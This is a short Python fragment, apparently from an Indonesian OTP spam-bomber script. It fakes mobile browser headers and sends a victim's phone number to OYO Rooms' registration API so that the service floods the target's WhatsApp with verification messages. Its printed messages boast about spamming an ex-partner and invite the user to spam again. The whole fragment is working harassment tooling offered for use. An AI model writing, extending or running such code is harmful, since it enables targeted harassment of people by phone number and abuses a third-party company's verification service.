   head = {
  "Host": "api.oyorooms.com",
  "content-length": "48",
  "accept": "application/json, text/plain, */*",
  "user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
  "content-type": "application/json",
  "origin": "https://www.oyorooms.com",
  "sec-fetch-site": "same-site",
  "sec-fetch-mode": "cors",
  "sec-fetch-dest": "empty",
  "referer": "https://www.oyorooms.com/",
  "accept-encoding": "gzip, deflate, br",
  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
  data = json.dumps({"phone_number":"+62"+nomer,"channel":"WA"})
  pos = requests.post("https://api.oyorooms.com/go-agent/v2/user/register",headers=head,data=data).text
  if "success" in pos:
    print("ANJAY SPAM WhatsApp Mantan Berhasil:)",k)
  else:
    print("Makannya Ganteng Biar Gak gagal ASIK KAN YO SPAM LAGI",k)
